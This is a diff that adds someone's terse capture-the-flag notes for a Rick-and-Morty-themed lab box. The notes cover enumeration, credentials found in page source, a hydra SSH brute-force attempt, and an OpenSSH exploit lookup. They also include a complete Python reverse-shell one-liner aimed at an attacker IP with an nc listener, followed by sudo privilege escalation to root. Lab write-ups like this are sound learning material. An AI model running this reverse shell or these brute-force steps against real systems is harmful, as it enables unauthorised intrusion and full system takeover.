@@ -1,0 +1,118 @@
+https://www.exploit-db.com/exploits/40136
+https://www.youtube.com/watch?v=oCAtfcr3iUw
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+					Enum
+
+
+$sudo curl http://10.10.223.213/ -o  mainpage.html
+
+(foud potential user:R1ckRul3s)
+(found potential pass:Wubbalubbadubdub)
+
+
+(found dir)
+
+/assets
+
+(wget assets) 
+
+(tried ssh)
+sudo hydra -l R1ckRul3s -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ssh://10.10.223.213 -o  hydra.txt
+
+(need key)
+
+(found stuff)
+/login.php
+/robots.txt
+
+					Exploitation
+
+service: OpenSSH 7.2p2
+
+searchsploit Openssh
+
+OpenSSH 7.2p2 - Username Enumeration                                   | linux/remote/40136.py
+
+
+
+
+
+
+
+
+					Command Panel
+
+$ls 					
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+
+
+$cat clue.txt
+Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
+
+
+$while read line; do echo $line; done < clue.txt
+Look around the file system for the other ingredient.
+
+$while read line; do echo $line; done < Sup3rS3cretPickl3Ingred.txt
+mr. meeseek hair
+
+$grep . -R 
+(ctrl + u)
+(view in grep1.txt)
+
+
+
+(found some b64)
+$echo 'Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==' | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
+
+(multiple layers of b64)
+
+rabbit hole
+
+
+$python 3 --version
+python 3.5.2
+
+
+
+					Rshell
+
+(listener)
+
+$nc -lvnp 9999
+
+(execute python shell)
+
+$python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.26.235",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+
+					Privesc
+
+(user can run all things as root)
+
+$sudo bash
+
+					Snooping
+$cd 
+
+$cat 3rd.txt
+
+fleeb juice 
+
+$cd /home
+
+$cd rick/
+
+$cat *
+
+1 jerry tear
+
